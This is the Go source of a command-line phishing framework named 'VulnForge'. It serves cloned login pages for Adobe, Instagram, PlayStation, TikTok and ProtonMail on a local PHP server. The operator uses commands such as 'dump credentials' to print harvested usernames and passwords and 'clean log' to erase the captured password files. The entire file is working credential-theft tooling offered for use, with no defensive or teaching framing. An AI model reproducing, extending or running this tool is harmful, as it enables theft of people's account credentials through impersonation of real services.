package main
import (
	"fmt"
	"os"
	"os/exec"
	"math/rand"
	"github.com/chzyer/readline"
	"strings"
	"os/signal"
)
func main(){
	c := make(chan os.Signal, 1);
	signal.Notify(c, os.Interrupt);
	banner();
	for {
		user, err := readline.New("VulnForge>>> ");
		if err != nil {
			fmt.Println(err);
		}
		final, err := user.Readline();
		if err != nil {
			fmt.Println(err);
		}
		partes := strings.Split(final, " ");
		var contador int = len(partes);
		if contador == 1 {
			if partes[0] == "exit"||partes[0] == "quit"{
				break;

			}
		}
		if contador == 2 {
			if partes[0] == "list" && partes[1] == "phishing"{
				cat_exec("cat", "./path/phishing.txt");
			}
			if partes[0] == "set" && partes[1] == "/phish/adobe"{
				for {
					log, err := readline.New("/phish/adobe >>> ");
					if err != nil {
						fmt.Println(err);
					}
					cr, err := log.Readline();
					if err != nil {
						break;
					}
					ind := strings.Split(cr, " ");
					var cont int = len(ind);
					if cont == 1 {
						if ind[0]=="start"{
							complejo("./sites/adobe");
							select {
							case <-c:
								continue;
							}
					    }
						if(ind[0]=="exit" || ind[0]=="back" || ind[0]=="quit"){
							break;
						}
					}
					if cont == 2 {
						if(ind[0]=="dump" && ind[1]=="credentials"){
							cat_exec("cat", "./sites/adobe/usernames.txt");
						}
						if(ind[0]=="clean" && ind[1]=="log"){
							delete("./sites/adobe/usernames.txt")
						}
					}
				}

			}
			if partes[0]=="set" && partes[1]=="/phish/instagram"{
				for {
					con, err := readline.New("/phish/instagram >>> ");
					if err != nil {
						fmt.Println(err);
					}
					noc, err := con.Readline();
					if err != nil {
						fmt.Println(err);
					}
					str := strings.Split(noc, " ");
					var count int = len(str);
					if(count == 1){
						if(str[0]=="exit" || str[0]=="back" || str[0]=="quit"){
							break;
						}
						if(str[0]=="start" || str[0]=="run"){
							complejo("./sites/instagram");
							select {
							case <-c:
								continue;
							}
						}
					}
					if(count == 2){
						if(str[0]=="dump" && str[1]=="credentials"){
							cat_exec("cat", "./sites/instagram/usernames.txt");
						}
						if(str[0]=="clean" && str[1]=="log"){
							delete("./sites/instagram/usernames.txt");
						}
					}

				}
			}
			if(partes[0]=="set" && partes[1]=="/phish/playstation"){
				for{
					play, err := readline.New("/phish/playstation >>> ");
					if err != nil {
						fmt.Println(err);
					}
					yal, err := play.Readline();
					if err != nil {
						fmt.Println(err);
					}
					rts := strings.Split(yal, " ");
					integer := len(rts);
					if(integer == 1){
						if(rts[0]=="exit" || rts[0]=="quit" || rts[0]=="quit"){
							break;
						}
						if(rts[0]=="start" || rts[0]=="run"){
							complejo("./sites/playstation");
							select {
							case <-c:
								continue;
							}
						}
					}
					if(integer == 2){
						if(rts[0]=="dump" && rts[1]=="credentials"){
							cat_exec("cat", "./sites/playstation/usernames.txt");
						}
						if(rts[0]=="clean" && rts[1]=="log"){
							delete("./sites/playstation/usernames.txt");
						}
					}

				}
			}
			if(partes[0]=="set" && partes[1]=="/phish/tiktok"){
				for{
				    tik, err := readline.New("/phish/tiktok >>> ");
				    if err != nil {
					    fmt.Println(err);
				    }
					kit, err := tik.Readline();
				    ss := strings.Split(kit, " ");
				    ii := len(ss);
				    if(ii == 1){
					    if(ss[0]=="exit" || ss[0]=="back" || ss[0]=="quit"){
						    break;
					    }
					    if(ss[0]=="start" || ss[0]=="run"){
						    complejo("./sites/tiktok");
						    select {
						    case <-c:
							    continue;
						    }
					    }
				    }
				    if(ii== 2){
					    if(ss[0]=="dump" && ss[1]=="credentials"){
						    cat_exec("cat", "./sites/tiktok/usernames.txt");
					    }
					    if(ss[0]=="clean" && ss[1]=="log"){
						    delete("./sites/tiktok/usernames.txt");
					    }
				    }
				}
			}
			if(partes[0]=="set" && partes[1] == "/phish/protonmail"){
				for{
				    pro, err := readline.New("/phish/protonmail >>> ");
				    if err != nil {
					    fmt.Println(err);
				    }
				    orp, err := pro.Readline();
				    if err != nil {
					    fmt.Println(err);
				    }
				    sp := strings.Split(orp, " ");
				    ct := len(sp);
				    if(ct==1){
					    if(sp[0]=="exit" || sp[0]=="back" || sp[0]=="quit"){
						    break;
					    }
					    if(sp[0]=="start"||sp[0]=="run"){
						    complejo("./sites/protonmail");
						    select {
						    case <-c:
							    continue;
						    }
					    }
				    }
				    if(ct==2){
					    if(sp[0]=="dump" && sp[1]=="credentials"){
						    cat_exec("cat", "./sites/protonmail/usernames.txt");
					    }
					    if(sp[0]=="clean" && sp[1]=="log"){
						    delete("./sites/protonmail/usernames.txt");
					    }
				    }
				}
			}
		}

	}
}

func delete(prompt string){
	fmt.Println("[*] password log cleaned");
	cat_exec("rm", prompt);
	cat_exec("touch", prompt);
}
func complejo(com1 string){
	print();
	comando := exec.Command("php", "-S", "127.0.0.1:8080", "-t", com1);
	output, 
	err := comando.Output();
	if err != nil {
		fmt.Println("Error: ", err);
	}
	fmt.Println(string(output));
}
func print(){
	fmt.Println("server started at the following url http://127.0.0.1:8080");
}
func set(){
	fmt.Println("set /path/to/phishing");
}
func cat_exec(var1 string, var2 string){
	cm := exec.Command(var1, var2);
	output, err := cm.Output();
	if err != nil {
		fmt.Println(err);
	}
	fmt.Println(string(output));
}
func banner(){
	ban := [4]string{"ban01.txt", "ban02.txt", "ban03.txt", "ban04.txt"};
	num := rand.Intn(4);
	control := exec.Command("cat", "./banners/"+ban[num]);
	output, err := control.Output();
	if err != nil {
		fmt.Println("Error: ", err);
	}
	fmt.Println(string(output));
}
